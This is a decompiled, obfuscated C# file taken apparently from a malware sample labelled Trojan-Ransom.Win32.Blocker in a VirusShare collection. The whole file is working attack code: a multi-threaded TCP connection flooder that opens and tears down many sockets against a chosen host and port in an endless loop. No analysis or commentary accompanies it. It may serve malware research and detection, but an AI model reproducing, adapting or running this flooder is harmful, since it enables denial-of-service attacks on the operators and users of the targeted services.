// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Driver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 31A0C38B-3584-42BE-8C71-509BA5DF4465
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.cnvx-6c4df7ef35e4d5aa4c5d4df1ed2dc33691c7736a.exe

using \u0005;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal sealed class \u0004
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0002;
    private static IPEndPoint \u0003;
    private static \u0004.\u0001[] \u0004;
    public static string \u0005;
    public static ushort \u0006;
    public static int \u0007;
    public static int \u0008;

    public static void \u0003()
    {
      try
      {
        \u0004.\u0003 = new IPEndPoint(\u001B\u0003.\u007E\u008C\u0004((object) \u0018\u0003.\u007F\u0004(\u0004.\u0005))[0], (int) \u0004.\u0006);
      }
      catch
      {
        \u0004.\u0003 = new IPEndPoint(\u009F\u0002.\u008A\u0004(\u0004.\u0005), (int) \u0004.\u0006);
      }
      \u0004.\u0002 = new Thread[\u0004.\u0008];
      \u0004.\u0001 = new ThreadStart[\u0004.\u0008];
      \u0004.\u0004 = new \u0004.\u0001[\u0004.\u0008];
      for (int index = 0; index < \u0004.\u0008; ++index)
      {
        \u0004.\u0004[index] = new \u0004.\u0001(\u0004.\u0003, \u0004.\u0007);
        \u0004.\u0001[index] = new ThreadStart(\u0004.\u0004[index].\u0003);
        \u0004.\u0002[index] = new Thread(\u0004.\u0001[index]);
        \u0090\u0003.\u007E\u0097\u0002((object) \u0004.\u0002[index]);
      }
    }

    public static void \u0004()
    {
      for (int index = 0; index < \u0004.\u0008; ++index)
      {
        try
        {
          \u0090\u0003.\u007E\u0098\u0002((object) \u0004.\u0002[index]);
          \u0090\u0003.\u007E\u0099\u0002((object) \u0004.\u0002[index]);
        }
        catch
        {
        }
      }
    }

    private sealed class \u0001
    {
      private IPEndPoint \u0001;
      private Socket[] \u0002;
      private int \u0003;

      public \u0001([In] IPEndPoint obj0, [In] int obj1)
      {
        this.\u0001 = obj0;
        this.\u0003 = obj1;
      }

      private void \u0003([In] IAsyncResult obj0)
      {
        try
        {
          Socket socket = (Socket) \u0082\u0003.\u007E\u007F\u0002((object) obj0);
          \u009C.\u007E\u0097\u0004((object) socket, false);
          \u0090\u0003.\u007E\u0094\u0004((object) socket);
        }
        catch
        {
        }
      }

      public void \u0003()
      {
label_0:
        try
        {
          this.\u0002 = new Socket[this.\u0003];
          for (int index = 0; index < this.\u0003; ++index)
          {
            this.\u0002[index] = new Socket(\u009B\u0002.\u007E\u0080\u0004((object) this.\u0001), SocketType.Stream, ProtocolType.Tcp);
            \u009C.\u007E\u0092\u0004((object) this.\u0002[index], false);
            AsyncCallback asyncCallback = new AsyncCallback(this.\u0003);
            IAsyncResult asyncResult = \u0006\u0002.\u007E\u0096\u0004((object) this.\u0002[index], (EndPoint) this.\u0001, asyncCallback, (object) this.\u0002[index]);
          }
          \u001C\u0002.\u009A\u0002(100);
          for (int index = 0; index < this.\u0003; ++index)
          {
            if (\u0099.\u007E\u0093\u0004((object) this.\u0002[index]))
              \u009C.\u007E\u0097\u0004((object) this.\u0002[index], false);
            \u0090\u0003.\u007E\u0094\u0004((object) this.\u0002[index]);
            this.\u0002[index] = (Socket) null;
          }
          goto label_0;
        }
        catch
        {
          for (int index = 0; index < this.\u0003; ++index)
          {
            try
            {
              if (\u0099.\u007E\u0093\u0004((object) this.\u0002[index]))
                \u009C.\u007E\u0097\u0004((object) this.\u0002[index], false);
              \u0090\u0003.\u007E\u0094\u0004((object) this.\u0002[index]);
              this.\u0002[index] = (Socket) null;
            }
            catch
            {
            }
          }
          goto label_0;
        }
      }
    }
  }
}
